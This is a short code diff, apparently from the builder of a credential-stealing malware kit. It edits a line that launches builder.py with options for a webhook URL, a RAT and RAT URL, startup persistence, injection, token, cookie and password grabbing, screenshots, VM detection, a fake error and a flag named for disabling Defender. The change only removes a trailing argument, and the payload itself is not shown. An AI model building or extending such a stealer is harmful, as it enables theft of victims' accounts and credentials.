@@ -269,7 +269,7 @@ def __build():
          
     path = f'{Path(__file__).resolve().parent}\\builder.py'
     logger.info(f"Path: {path}")
-    msg = f"start cmd /c py {path} {xbuildname} {xwehookurl} {xrat} {xraturl} {xstartup} {xinjection} {xtoken} {xcookie} {xpassword} {xmalicious} {xlocation} {xroblox} {xscreenshot} {xping} {xvmdetect} {xvmwebhookurl} {xfakeerror} {xnitrobuy} {xdefenderfucker} False"
+    msg = f"start cmd /c py {path} {xbuildname} {xwehookurl} {xrat} {xraturl} {xstartup} {xinjection} {xtoken} {xcookie} {xpassword} {xmalicious} {xlocation} {xroblox} {xscreenshot} {xping} {xvmdetect} {xvmwebhookurl} {xfakeerror} {xnitrobuy} {xdefenderfucker}"
     logger.info(f"MSGLine to compile: {msg}")
     
     output = subprocess.check_output(msg, shell=True, encoding='utf-8')
